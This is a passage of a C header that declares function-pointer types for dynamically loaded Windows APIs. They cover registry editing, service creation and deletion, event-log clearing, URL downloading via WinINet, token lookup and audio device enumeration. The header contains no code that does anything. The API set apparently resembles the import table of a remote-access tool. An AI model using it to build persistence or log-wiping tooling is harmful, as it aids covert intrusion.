    __out LPRECT lprc,
    __in int xLeft,
    __in int yTop,
    __in int xRight,
    __in int yBottom);

typedef BOOL
(WINAPI
*IsValidSidT)(
    __in PSID pSid
    );

typedef LONG
(APIENTRY
*RegCloseKeyT)(
    __in HKEY hKey
    );

typedef LONG
(APIENTRY
*RegQueryValueAT)(
    __in HKEY hKey,
    __in_opt LPCSTR lpSubKey,
    __out_bcount_opt(*lpcbData) LPSTR lpData,
    __inout_opt PLONG lpcbData
    );

typedef LONG
(APIENTRY
*RegOpenKeyExAT)(
    __in HKEY hKey,
    __in_opt LPCSTR lpSubKey,
    __reserved DWORD ulOptions,
    __in REGSAM samDesired,
    __out PHKEY phkResult
    );

typedef BOOL
(WINAPI
*StartServiceAT)(
    __in            SC_HANDLE            hService,
    __in            DWORD                dwNumServiceArgs,
    __in_ecount_opt(dwNumServiceArgs)       
                    LPCSTR             *lpServiceArgVectors
    );

typedef BOOL
(WINAPI
*CloseServiceHandleT)(
    __in        SC_HANDLE   hSCObject
    );

typedef SC_HANDLE
(WINAPI
*OpenServiceAT)(
    __in            SC_HANDLE               hSCManager,
    __in            LPCSTR                lpServiceName,
    __in            DWORD                   dwDesiredAccess
    );

typedef LONG
(APIENTRY
*RegSetValueExAT)(
    __in HKEY hKey,
    __in_opt LPCSTR lpValueName,
    __reserved DWORD Reserved,
    __in DWORD dwType,
    __in_bcount_opt(cbData) CONST BYTE* lpData,
    __in DWORD cbData
    );

typedef BOOL
(WINAPI
*CloseEventLogT)(
    __in HANDLE hEventLog
    );

typedef BOOL
(WINAPI
*ClearEventLogAT)(
    __in     HANDLE hEventLog,
    __in_opt LPCSTR lpBackupFileName
    );

typedef HANDLE
(WINAPI
*OpenEventLogAT)(
    __in_opt LPCSTR lpUNCServerName,
    __in     LPCSTR lpSourceName
    );

typedef LONG
(APIENTRY
*RegEnumKeyExAT)(
    __in HKEY hKey,
    __in DWORD dwIndex,
    __out_ecount_opt(*lpcchName) LPSTR lpName,
    __inout LPDWORD lpcchName,
    __reserved LPDWORD lpReserved,
    __inout_ecount_opt(*lpcchClass) LPSTR lpClass,
    __inout_opt LPDWORD lpcchClass,
    __out_opt PFILETIME lpftLastWriteTime
    );

typedef LONG
(APIENTRY
*RegCreateKeyExAT)(
    __in HKEY hKey,
    __in LPCSTR lpSubKey,
    __reserved DWORD Reserved,
    __in_opt LPSTR lpClass,
    __in DWORD dwOptions,
    __in REGSAM samDesired,
    __in_opt LPSECURITY_ATTRIBUTES lpSecurityAttributes,
    __out PHKEY phkResult,
    __out_opt LPDWORD lpdwDisposition
    );

typedef SC_HANDLE
(WINAPI
*OpenSCManagerAT)(
    __in_opt        LPCSTR                lpMachineName,
    __in_opt        LPCSTR                lpDatabaseName,
    __in            DWORD                   dwDesiredAccess
    );

typedef BOOL
(WINAPI 
*InternetReadFileT)(
    __in HINTERNET hFile,
    __out_bcount(dwNumberOfBytesToRead) LPVOID lpBuffer,
    __in DWORD dwNumberOfBytesToRead,
    __out LPDWORD lpdwNumberOfBytesRead
    );

typedef HINTERNET
(WINAPI 
*InternetOpenUrlAT)(
    __in HINTERNET hInternet,
    __in LPCSTR lpszUrl,
    __in_ecount_opt(dwHeadersLength) LPCSTR lpszHeaders,
    __in DWORD dwHeadersLength,
    __in DWORD dwFlags,
    __in_opt DWORD_PTR dwContext
    );

typedef LONG
(APIENTRY
*RegEnumValueAT)(
    __in HKEY hKey,
    __in DWORD dwIndex,
    __out_ecount_opt(*lpcchValueName) LPSTR lpValueName,
    __inout LPDWORD lpcchValueName,
    __reserved LPDWORD lpReserved,
    __out_opt LPDWORD lpType,
    __out_bcount_opt(*lpcbData) LPBYTE lpData,
    __inout_opt LPDWORD lpcbData
    );

typedef LONG
(APIENTRY
*RegDeleteKeyAT)(
    __in HKEY hKey,
    __in LPCSTR lpSubKey
    );

typedef LONG
(APIENTRY
*RegDeleteValueAT)(
    __in HKEY hKey,
    __in_opt LPCSTR lpValueName
    );

typedef LONG
(APIENTRY
*RegQueryInfoKeyAT)(
    __in HKEY hKey,
    __out_ecount_opt(*lpcchClass) LPSTR lpClass,
    __inout_opt LPDWORD lpcchClass,
    __reserved LPDWORD lpReserved,
    __out_opt LPDWORD lpcSubKeys,
    __out_opt LPDWORD lpcbMaxSubKeyLen,
    __out_opt LPDWORD lpcbMaxClassLen,
    __out_opt LPDWORD lpcValues,
    __out_opt LPDWORD lpcbMaxValueNameLen,
    __out_opt LPDWORD lpcbMaxValueLen,
    __out_opt LPDWORD lpcbSecurityDescriptor,
    __out_opt PFILETIME lpftLastWriteTime
    );

typedef BOOL
(WINAPI
*UnlockServiceDatabaseT)(
    __in            SC_LOCK             ScLock
    );

typedef BOOL
(WINAPI
*ChangeServiceConfigAT)(
    __in        SC_HANDLE    hService,
    __in        DWORD        dwServiceType,
    __in        DWORD        dwStartType,
    __in        DWORD        dwErrorControl,
    __in_opt    LPCSTR     lpBinaryPathName,
    __in_opt    LPCSTR     lpLoadOrderGroup,
    __out_opt   LPDWORD      lpdwTagId,
    __in_opt    LPCSTR     lpDependencies,
    __in_opt    LPCSTR     lpServiceStartName,
    __in_opt    LPCSTR     lpPassword,
    __in_opt    LPCSTR     lpDisplayName
    );

typedef BOOL
(WINAPI
*ChangeServiceConfig2AT)(
    __in        SC_HANDLE    hService,
    __in        DWORD        dwInfoLevel,
    __in_opt    LPVOID       lpInfo
    );

typedef BOOL
(WINAPI
*GetTokenInformationT)(
    __in      HANDLE TokenHandle,
    __in      TOKEN_INFORMATION_CLASS TokenInformationClass,
    __out_bcount_part_opt(TokenInformationLength, *ReturnLength) LPVOID TokenInformation,
    __in      DWORD TokenInformationLength,
    __out_opt PDWORD ReturnLength
    );

typedef HANDLE
(WINAPI
*GetProcessHeapT)(
    VOID 
    );

typedef LPVOID
(WINAPI
*HeapAllocT)(
    __in HANDLE hHeap,
    __in DWORD dwFlags,
    __in SIZE_T dwBytes
    );

typedef BOOL
(WINAPI
*HeapFreeT)(
    __inout HANDLE hHeap,
    __in    DWORD dwFlags,
    __deref LPVOID lpMem
    );

typedef BOOL
(WINAPI
*LookupAccountSidAT)(
    __in_opt LPCSTR lpSystemName,
    __in PSID Sid,
    __out_ecount_part_opt(*cchName, *cchName + 1) LPSTR Name,
    __inout  LPDWORD cchName,
    __out_ecount_part_opt(*cchReferencedDomainName, *cchReferencedDomainName + 1) LPSTR ReferencedDomainName,
    __inout LPDWORD cchReferencedDomainName,
    __out PSID_NAME_USE peUse
    );

typedef BOOL
(WINAPI
*EnumServicesStatusAT)(
    __in            SC_HANDLE               hSCManager,
    __in            DWORD                   dwServiceType,
    __in            DWORD                   dwServiceState,
    __out_bcount_opt(cbBufSize)
                    LPENUM_SERVICE_STATUSA  lpServices,
    __in            DWORD                   cbBufSize,
    __out           LPDWORD                 pcbBytesNeeded,
    __out           LPDWORD                 lpServicesReturned,
    __inout_opt     LPDWORD                 lpResumeHandle
    );

typedef BOOL
(WINAPI
*QueryServiceConfigAT)(
    __in            SC_HANDLE               hService,
    __out_bcount_opt(cbBufSize)      
                    LPQUERY_SERVICE_CONFIGA lpServiceConfig,
    __in            DWORD                   cbBufSize,
    __out           LPDWORD                 pcbBytesNeeded
    );

typedef BOOL
(WINAPI
*ControlServiceT)(
    __in        SC_HANDLE           hService,
    __in        DWORD               dwControl,
    __out       LPSERVICE_STATUS    lpServiceStatus
    );

typedef BOOL
(WINAPI
*DeleteServiceT)(
    __in        SC_HANDLE   hService
    );

typedef BOOL
(WINAPI
*QueryServiceStatusT)(
    __in            SC_HANDLE           hService,
    __out           LPSERVICE_STATUS    lpServiceStatus
    );

typedef SC_LOCK
(WINAPI
*LockServiceDatabaseT)(
    __in            SC_HANDLE               hSCManager
    );

typedef SC_HANDLE
(WINAPI
*CreateServiceAT)(
    __in        SC_HANDLE    hSCManager,
    __in        LPCSTR     lpServiceName,
    __in_opt    LPCSTR     lpDisplayName,
    __in        DWORD        dwDesiredAccess,
    __in        DWORD        dwServiceType,
    __in        DWORD        dwStartType,
    __in        DWORD        dwErrorControl,
    __in_opt    LPCSTR     lpBinaryPathName,
    __in_opt    LPCSTR     lpLoadOrderGroup,
    __out_opt   LPDWORD      lpdwTagId,
    __in_opt    LPCSTR     lpDependencies,
    __in_opt    LPCSTR     lpServiceStartName,
    __in_opt    LPCSTR     lpPassword
    );

typedef UINT 
(WINAPI 
*waveInGetNumDevsT)(
void
);









































